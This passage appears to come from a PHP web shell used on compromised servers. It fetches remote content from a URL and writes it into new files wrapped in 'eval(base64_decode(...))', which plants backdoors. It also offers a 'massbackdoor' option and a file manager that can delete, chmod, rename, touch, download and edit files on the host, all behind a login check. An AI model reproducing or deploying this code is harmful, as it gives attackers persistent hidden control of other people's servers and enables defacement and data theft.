if(file_put_contents(base64_decode($upname), "<?php eval(base64_decode(".$updata.")); ?>")){
echo "<hr color='lime'>>> <font color='lime'>$upname&nbsp&nbsp&nbsp&nbsp</font><font color='lime'>(&#10003;)</font>";
}else{}}else{echo "Error! ".$httpcode;}
}else{
$context = stream_context_create(['http' => ['ignore_errors' => true]]);
$result = file_get_contents($urldefacerph, false, $context);
$httpresponse = explode(" ", $http_response_header[0]);
if($httpresponse[1] == 200){
$updata = file_get_contents($urldefacerph);
if(file_put_contents(base64_decode($upname), "<?php eval(base64_decode(".$updata.")); ?>")){
echo "<hr color='lime'>>> <font color='lime'>$upname&nbsp&nbsp&nbsp&nbsp</font><font color='lime'>(&#10003;)</font>";
}
}else{
echo "Error: File source was not found!";
}
}
}elseif(isset($_GET["massbackdoor"])){
echo $notavail;
}else{
?>
<div id="content"><table width="800" border="0" cellpadding="3" cellspacing="1" align="center">
<tr class="first">
<td><center>[+] Files & Folder [+]</SCA></center></td>
<td><center>[+] Size [+]</SCA></center></td>
<td><center>[+] Permission [+]</peller></center></td>
<td><center>[+] Date & Time [+]</SCA></center></td>
<td><center>[+] Modify [+]</SCA></center></td>
</tr><tr>
<?php
$pathback = dirname("?path=$path"). PHP_EOL;
echo "<tr><td><a href='$pathback'>..</a></td><center><td><center>--</center></td>
<td><center>--</center></td>
<td><center>--</center></td>
<td><center><form method='post'><input type='hidden' name='path' value='$path'><input type='hidden' name='newf' value='file'><input type='submit' value='New File'></form>
<form method='post'><input type='hidden' name='path' value='$path'>
<input type='hidden' name='newf' value='folder'><input type='submit' value='New Dir'>
</form></center></td>
</tr>";

foreach(array_unique($scandir) as $dir){
if(!is_dir($path.'/'.$dir) || $dir == '.' || $dir == '..') continue;
$size = filesize($path.'/'.$dir)/1024;
$size = round($size,3);
if($size >= 1024){
$size = round($size/1024,2).' MB';
}else{
$size = $size.' KB';
//echo $size;
}
echo '
<td><a href="?path='.$path.'/'.$dir.'">'.$dir.'</a></td>
<center>';
if(is_writable($path.'/'.$dir)) echo '<font color="red" size="2">';
elseif(!is_readable($path.'/'.$dir)) echo '<font color="white" size="2">';
//echo perms($path.'/'.$dir);
if(is_writable($path.'/'.$dir) || !is_readable($path.'/'.$dir)) echo '</font>';

echo'
<td><center><font color="white">--</font></center></td>';
$fpermi = substr(sprintf('%o', fileperms("$path/$file")), -4);
echo"
<td><center><font color='yellow'>$fpermi</font></center></td>
";
$datef = date("F j, Y h:i A", filemtime("$path/$dir"));
echo "<td><center><font color='yellow'>$datef</font></center></td>";
echo'
<td><center>
<form method="POST" action="?option&path='.$path.'">
<select name="opt">
<option value=""> Menu </option>
<option value="delete">[+] Delete [+]</option>
<option value="chmod">[+] Chmod [+]</option>
<option value="rename">[+] Rename [+]</option>
<option value="touch">[+] Touch [+]</option>
</select>
<input type="hidden" name="type" value="dir">
<input type="hidden" name="fdate" value="'.$datef.'">
<input type="hidden" name="chmodper" value="'.$fpermi.'">
<input type="hidden" name="name" value="'.$dir.'">
<input type="hidden" name="path" value="'.$path.'/'.$dir.'">
<input type="submit" value=">>">
</form>
</center></td><tr>';
}
echo "<td><hr></td><td><hr></td><td><hr></td><td><hr></td><td><hr></td>";
//echo '<tr class="first"><td></td><td></td><td></td><td></td></tr>';
foreach(array_unique($scandir) as $file){
if(!is_file($path.'/'.$file)) continue;
$size = filesize($path.'/'.$file)/1024;
$size = round($size,3);
if($size >= 1024){
$size = round($size/1024,2).' MB';
}else{
$size = $size.' KB';
//echo $size;
}

echo '<tr>
<td><a href="?filesrc='.$path.'/'.$file.'&path='.$_GET['path'].'">'.$file.'</a></td>
<td><center>'.$size.'</center></td>

';
$fpermi = substr(sprintf('%o', fileperms("$path/$file")), -4);
echo"
<td><center><font color='yellow'>$fpermi</font></center></td>
";
$datef = date("F j, Y h:i A", filemtime("$path/$file"));
echo "<td><center><font color='yellow'>$datef</font></center></td>";
echo'<td><center>
<form method="POST" action="?option&path='.$path.'">
<select name="opt">
<option value=""> Menu </option>
<option value="delete">[+] Delete [+]</option>
<option value="chmod">[+] Chmod [+]</option>
<option value="rename">[+] Rename [+]</option>
<option value="touch">[+] Touch [+]</option>
<option value="download">[+] Download [+]</option>
<option value="edit">[+] Edit [+]</option>
</select>
<input type="hidden" name="type" value="file">
<input type="hidden" name="fdate" value="'.$datef.'">
<input type="hidden" name="chmodper" value="'.$fpermi.'">
<input type="hidden" name="name" value="'.$file.'">
<input type="hidden" name="path" value="'.$path.'/'.$file.'">
<input type="submit" value=">>">
</form>
</center></td><tr>';

}} 
?>
<?php

}else{echo $login;}

?>
